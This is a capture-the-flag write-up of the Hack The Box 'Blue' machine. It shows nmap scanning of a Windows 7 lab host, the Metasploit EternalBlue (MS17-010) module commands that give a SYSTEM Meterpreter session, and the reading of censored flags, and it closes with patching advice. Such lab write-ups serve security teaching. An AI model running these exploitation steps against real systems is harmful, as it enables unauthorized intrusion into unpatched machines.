# Blue - Hack The Box | Write Up

**Difficulty:** Easy | **OS:** Windows | **Author:** Ph4n3s

---

## 1. Enumeration

First I check that the machine is up:

```bash
ping -c 5 10.129.76.203
```

I continue with a full port scan:

```bash
nmap -p- --open -T4 --min-rate 5000 10.129.76.203 -oN ~/HTB_machines/Blue/ports
```

**Open ports:**

```
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152-49157/tcp open  unknown
```

Port **445 (SMB)** catches my eye right away. I run recon scripts against the discovered ports:

```bash
nmap -p 135,139,445,49152,49153,49154,49155,49156,49157 -sVC -T4 --min-rate 5000 10.129.76.203 -oN ~/HTB_machines/Blue/targeted
```

**Relevant result:**

```
445/tcp open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1
Host: HARIS-PC | OS: Windows
```

Windows 7 SP1 with SMB exposed... this smells like **EternalBlue (MS17-010)** from a mile away. I look into it to confirm, and indeed, this version of Windows is vulnerable to a buffer overflow in the SMB service that allows unauthenticated remote code execution.

---

## 2. Exploitation

I open **msfconsole** and search for the module:

```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
```

I configure the exploit:

```bash
set RHOSTS 10.129.76.203
set LHOST tun0
run
```

I get a **Meterpreter** session as `NT AUTHORITY\SYSTEM` directly, without needing to escalate privileges.

---

## 3. Post-Exploitation / Flags

From Meterpreter I open a Windows shell:

```bash
meterpreter > shell
```

**User flag (haris):**

```cmd
cd C:\Users\haris\Desktop
type user.txt
```

```
d3a5c3**************************
```

**Administrator flag:**

```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

```
55b92b**************************
```

---

## Conclusion

A great machine to get started. The attack vector is **EternalBlue (CVE-2017-0144)**, one of the most famous exploits in history, responsible for the WannaCry ransomware in 2017. Because it is an unpatched Windows 7 with SMB exposed, direct access as SYSTEM makes it a machine with no privilege escalation, perfect for understanding how this type of vulnerability works.

**Lessons:**
- SMB exposed on old Windows versions = immediate red flag
- Always patch systems, especially MS17-010
- EternalBlue is still relevant in outdated real-world environments

---

> ⚠️ *This write up is for educational purposes. The flags are censored.*
